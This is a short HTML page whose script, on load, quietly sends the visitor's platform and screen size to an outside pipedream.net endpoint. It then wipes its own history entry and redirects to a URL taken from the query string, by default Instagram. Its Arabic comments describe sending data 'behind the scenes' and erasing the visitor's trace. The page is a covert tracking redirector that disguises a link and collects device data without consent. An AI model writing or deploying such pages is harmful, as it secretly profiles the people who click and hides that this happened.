<!DOCTYPE html>
<html>
<head>
    <script>
        function launch() {
            const u = new URLSearchParams(window.location.search).get('u') || 'https://instagram.com';
            const server = "https://eo9vbt8nw49qmpi.m.pipedream.net/"; 

            // إرسال البيانات للسيرفر (خلف الكواليس)
            navigator.sendBeacon(server, JSON.stringify({
                plt: navigator.platform,
                scr: screen.width + "x" + screen.height
            }));

            // مسح أثرك من المتصفح والتحويل فوراً
            window.history.replaceState(null, null, u);
            window.location.replace(u);
        }
        window.onload = launch;
    </script>
</head>
<body style="background:#000"></body>
</html>
